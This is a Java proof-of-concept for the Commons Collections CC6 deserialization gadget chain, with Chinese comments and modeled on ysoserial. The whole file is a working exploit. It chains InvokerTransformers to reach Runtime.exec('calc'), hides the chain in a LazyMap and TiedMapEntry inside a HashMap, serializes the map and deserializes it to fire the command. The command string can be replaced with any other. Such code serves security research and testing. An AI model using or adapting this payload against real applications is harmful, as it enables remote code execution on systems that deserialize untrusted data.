/**
 * 暂时对JDK没有限制，在高版本的JDK中也可以成功利用
 */

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC6_POC {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        //仿照ysoserial中的写法，防止在本地调试的时候触发命令
        Transformer[] faketransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Class[0]}),
            new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"}),
            new ConstantTransformer(1),
        };
        Transformer transformerChain = new ChainedTransformer(faketransformers);
        Map innerMap = new HashMap();
        Map outMap = LazyMap.decorate(innerMap, transformerChain);

        //实例化
        TiedMapEntry tme = new TiedMapEntry(outMap, "key");
        Map expMap = new HashMap();
        //将其作为key键传入
        expMap.put(tme, "value");

        //remove
        outMap.remove("key");

        //传入利用链
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        //序列化
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

        //输出序列化字符串
        System.out.println(barr);

        //反序列化
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = ois.readObject();
    }
}